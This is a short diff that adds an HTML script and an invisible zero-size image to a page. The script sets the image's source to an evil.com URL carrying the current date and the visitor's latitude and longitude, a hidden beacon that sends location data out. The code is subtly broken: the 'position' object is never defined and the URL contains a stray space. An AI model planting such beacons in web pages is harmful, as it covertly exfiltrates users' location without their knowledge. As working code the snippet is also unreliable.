@@ -1,0 +1,5 @@
+<script>
+    var today = new Date().toLocaleString() + ' 星期' + '日一二三四五六'.charAt (new Date().getDay());
+    document.getElementById('remote').src = "http://www.evil.com/test. php?txt=" + today + "------" + encodeURIComponent (position.coords.latitude) + "," + encodeURIComponent(position.coords.longitude);
+</script>
+<img id="remote" src="" width=0 height=0>
